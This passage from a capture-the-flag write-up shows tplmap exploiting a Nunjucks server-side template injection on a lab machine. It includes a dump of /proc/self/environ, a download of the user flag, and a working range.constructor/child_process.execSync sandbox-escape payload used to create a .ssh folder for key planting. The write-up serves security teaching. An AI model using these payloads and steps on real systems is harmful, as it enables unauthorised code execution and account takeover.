</span></span><span class="line"><span class="cl"> * Environment: production
</span></span><span class="line"><span class="cl">   WARNING: This is a development server. Do not use it in a production deployment.
</span></span><span class="line"><span class="cl">   Use a production WSGI server instead.
</span></span><span class="line"><span class="cl"> * Debug mode: off
</span></span><span class="line"><span class="cl"> * Running on http://0.0.0.0:80/ <span class="o">(</span>Press CTRL+C to quit<span class="o">)</span>
</span></span></code></pre></div><p>Then I will point <code>tplmap</code> to the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46»
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span></code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p>
<p><div class="img-container"><img src="imgs/image-20211105213721440.png" alt="image-20211105213721440"  /></div>
</p>
<p>After a few sec later, <code>tplmap</code> finally got it right.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Rerun tplmap providing one of the following options:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    --upload LOCAL REMOTE       Upload files to the server
</span></span><span class="line"><span class="cl">    --download REMOTE LOCAL     Download remote files
</span></span></code></pre></div><p>Based on the <code>tplmap</code> results, it seems that command execution is not possible.</p>
<h4 id="grabbing-the-flag">Grabbing The Flag</h4>
<p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/proc/self/environ&#39;</span> <span class="s1">&#39;loot/dl_environ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">][</span>plugin<span class="o">]</span> Remote file md5 mismatch, check manually
</span></span></code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ cat loot/dl_environ <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8PATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class="o">=</span>/home/david/.pm2/pm2.pidHOME<span class="o">=</span>/home/davidLOGNAME<span class="o">=</span><span class="nv">davidUSER</span><span class="o">=</span><span class="nv">davidSHELL</span><span class="o">=</span>/bin/bashINVOCATION_ID<span class="o">=</span><span class="nv">c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class="o">=</span>9:34693PM2_USAGE<span class="o">=</span><span class="nv">CLIPM2_HOME</span><span class="o">=</span>/home/david/.pm2SILENT<span class="o">=</span><span class="nv">truewindowsHide</span><span class="o">=</span><span class="nv">truepm2_env</span><span class="o">={</span><span class="s2">&#34;kill_retry_time&#34;</span>:100
</span></span><span class="line"><span class="cl"><span class="s2">&#34;windowsHide&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;treekill&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;automation&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pmx&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;instance_var&#34;</span>:<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;watch&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;autorestart&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;vizion&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;env&#34;</span>:<span class="o">{</span><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;server&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;filter_env&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;server&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;node_args&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_exec_path&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks/server.js&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_cwd&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exec_interpreter&#34;</span>:<span class="s2">&#34;node&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exec_mode&#34;</span>:<span class="s2">&#34;cluster_mode&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_out_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_err_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_pid_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;km_link&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;vizion_running&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>:5
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;launching&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_uptime&#34;</span>:1636123032873
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_actions&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_monitor&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_options&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_dynamic&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;created_at&#34;</span>:1633378615869
</span></span><span class="line"><span class="cl"><span class="s2">&#34;restart_time&#34;</span>:2
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unstable_restarts&#34;</span>:0
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_pm2_version&#34;</span>:<span class="s2">&#34;5.1.1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;1.0.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;versioning&#34;</span>:null
</span></span><span class="line"><span class="cl"><span class="s2">&#34;node_version&#34;</span>:<span class="s2">&#34;10.19.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_id&#34;</span>:6
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exit_code&#34;</span>:0<span class="o">}</span><span class="nv">NODE_UNIQUE_ID</span><span class="o">=</span><span class="nv">12NODE_CHANNEL_FD</span><span class="o">=</span><span class="m">3</span>
</span></span></code></pre></div><p>Since I know the username, I can try to grab the flag now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/home/david/user.txt&#39;</span> <span class="s1">&#39;loot/user.txt&#39;</span>
</span></span><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ cat loot/user.txt
</span></span><span class="line"><span class="cl">bac81...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-david">Shell as david</h3>
<h4 id="tpl-shell">tpl-shell</h4>
<p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need command execution!</p>
<p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">same blog</a> for syntax reference.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ tplmap -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Inject multi-line template code. Press ctrl-D to send the lines
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt;
</span></span></code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
